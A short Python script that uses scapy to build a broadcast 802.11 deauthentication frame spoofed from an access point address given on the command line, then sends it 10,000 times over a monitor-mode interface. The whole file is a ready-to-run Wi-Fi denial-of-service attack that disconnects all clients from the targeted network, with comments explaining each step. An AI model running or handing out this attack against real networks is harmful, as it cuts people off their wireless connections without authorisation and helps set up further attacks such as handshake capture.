#!/usr/bin/python

import sys
from scapy.all import *

brdmac =  "ff:ff:ff:ff:ff:ff" #creating a broadcast deauthentication packet

pkt = RadioTap() / Dot11( addr1 = brdmac, addr2 = sys.argv[1], addr3 = sys.argv[1])/ Dot11Deauth() #create packet

sendp(pkt, iface = "mon0", count = 10000, inter = .2) #sending packet on layer 2, defining the interface, number of packets and interpacket time


